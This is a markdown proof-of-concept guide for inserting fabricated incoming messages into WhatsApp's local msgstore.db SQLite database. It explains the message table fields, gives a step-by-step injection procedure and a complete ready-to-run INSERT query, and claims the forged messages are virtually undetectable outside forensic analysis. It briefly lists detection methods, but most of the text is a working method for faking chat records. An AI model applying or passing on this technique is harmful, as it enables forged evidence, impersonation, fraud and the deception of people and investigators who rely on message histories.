
# 💬 WHATSAPP MESSAGE INJECTION PROOF OF CONCEPT 💬

## 📂 Target
WhatsApp msgstore.db (SQLite)

## 🎯 Goal
Add a fabricated incoming message to any conversation this message is never actually sent, yet it will appear entirely authentic in the interface.

WhatsApp retains all messages on the device within the `msgstore.db` file. If you understand the format of the message table, you can insert a specifically crafted entry that makes WhatsApp perceive it as a valid message from the other participant.

## 📜 Database Fundamentals

`msgstore.db` → a local SQLite database consisting of various tables. The table of interest is: `message`.

Each row corresponds to a single message. Key fields include:
- **_id**                → Unique primary identifier (auto-incremented)
- **chat_row_id**        → The conversation associated with this message
- **from_me**            → 1 = sent from the device, 0 = received
- **key_id**             → Unique identifier for the message
- **timestamp**          → Time when sent (in Unix milliseconds)
- **received_timestamp** → Time when received
- **text_data**          → Content of the message
- **status**             → Delivery/read status (e.g., 13 = seen)
- **sort_id**            → Order of display in the chat

## ⚠️ Why Increment _id?
- The _id must be unique and greater than the last message's identifier.
- If the last _id is 532, the new one should be 533.
- The sort_id should align with the _id to ensure the correct order in the chat.

## 🛠 Complete Procedure

1. **Choose a genuine message** from the message table take note of its `chat_row_id`, `timestamp`, and `received_timestamp`.
2. **Draft an INSERT query** with:
   - `_id = last_id + 1`
   - Same `chat_row_id`
   - `from_me = 0` (indicate as received)
   - A realistic `key_id` (random hexadecimal string)
   - Adjusted timestamps
   - Custom `text_data` content
3. **Inject using sqlite3** or a database editor (with WhatsApp closed).
4. **Reopen WhatsApp** — the message will appear as if it has always been present.

## 💻 Query
```sql
INSERT INTO message (
    _id,
    chat_row_id,
    from_me,
    key_id,
    sender_jid_row_id,
    status,
    broadcast,
    recipient_count,
    participant_hash,
    origination_flags,
    origin,
    timestamp,
    received_timestamp,
    receipt_server_timestamp,
    message_type,
    text_data,
    starred,
    lookup_tables,
    message_add_on_flags,
    view_mode,
    sort_id,
    translated_text
) VALUES (
    533,  -- new_id value
    13,   -- chat_row_id
    0,    -- from_me
    'D83EE8287E7C2127C861AF61271BD5CD',
    0,    -- sender ID
    13,   -- status (13 = seen)
    0,
    0,
    0,    -- must be NULL/0 except for group messages
    0,
    0,
    1753651090000,
    1753651090677,
    1,
    0,
    'this is a test message',
    0,
    0,
    0,
    0,
    533,
    NULL
);
```

## 💡 Explanation of Functionality
WhatsApp does not verify the integrity of local messages there is no signature or checksum. When loading chats, it accepts whatever is present in `msgstore.db`.

## 🕵️ Potential Detection Methods
- Matching `key_id` values with `.crypt14` backups
- Identifying gaps or irregularities in timestamps
- Comparing with server backups

However, for typical device inspections, it remains virtually undetectable without forensic analysis tools.
